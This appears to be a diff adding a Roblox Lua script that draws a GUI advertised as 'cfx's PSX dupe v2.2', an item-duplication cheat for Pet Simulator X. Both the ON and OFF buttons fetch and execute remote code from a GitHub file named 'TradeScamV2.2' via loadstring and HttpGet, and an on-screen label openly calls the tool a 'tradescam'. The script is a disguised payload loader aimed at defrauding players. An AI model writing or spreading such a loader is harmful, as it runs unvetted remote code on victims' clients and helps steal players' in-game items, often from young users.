@@ -1,0 +1,99 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Frame_2 = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local OFF = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local ON = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(94, 94, 94)
+Frame.Position = UDim2.new(0.643483877, 0, 0.483146071, 0)
+Frame.Size = UDim2.new(0, 370, 0, 303)
+Frame.ZIndex = 0
+Frame.Active = true
+Frame.Draggable = true
+
+UICorner.Parent = Frame
+
+Frame_2.Parent = Frame
+Frame_2.BackgroundColor3 = Color3.fromRGB(129, 129, 129)
+Frame_2.Position = UDim2.new(0.0175135136, 0, 0.0199379623, 0)
+Frame_2.Size = UDim2.new(0, 357, 0, 290)
+
+UICorner_2.Parent = Frame_2
+
+OFF.Name = "OFF"
+OFF.Parent = Frame_2
+OFF.BackgroundColor3 = Color3.fromRGB(97, 97, 97)
+OFF.BorderSizePixel = 0
+OFF.Position = UDim2.new(0.616246521, 0, 0.42413795, 0)
+OFF.Size = UDim2.new(0, 129, 0, 56)
+OFF.Font = Enum.Font.SourceSansBold
+OFF.Text = "OFF"
+OFF.TextColor3 = Color3.fromRGB(255, 255, 255)
+OFF.TextScaled = true
+OFF.TextSize = 14.000
+OFF.TextWrapped = true
+OFF.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/enciticals/tradescam2.2/main/TradeScamV2.2"))()
+end)
+
+UICorner_3.Parent = OFF
+
+ON.Name = "ON"
+ON.Parent = Frame_2
+ON.BackgroundColor3 = Color3.fromRGB(97, 97, 97)
+ON.BorderSizePixel = 0
+ON.Position = UDim2.new(0.0280112047, 0, 0.42413795, 0)
+ON.Size = UDim2.new(0, 129, 0, 56)
+ON.Font = Enum.Font.SourceSansBold
+ON.Text = "ON"
+ON.TextColor3 = Color3.fromRGB(255, 255, 255)
+ON.TextScaled = true
+ON.TextSize = 14.000
+ON.TextWrapped = true
+ON.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/enciticals/tradescam2.2/main/TradeScamV2.2"))()
+end)
+
+UICorner_4.Parent = ON
+
+TextLabel.Parent = Frame_2
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0, 0, 0.0448275879, 0)
+TextLabel.Size = UDim2.new(0, 357, 0, 47)
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.Text = "cfx's PSX dupe v2.2"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+TextLabel_2.Parent = Frame_2
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.0280112047, 0, 0.69655174, 0)
+TextLabel_2.Size = UDim2.new(0, 331, 0, 79)
+TextLabel_2.Font = Enum.Font.SourceSansBold
+TextLabel_2.Text = "this tradescam is still in beta. glitches will be expected."
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
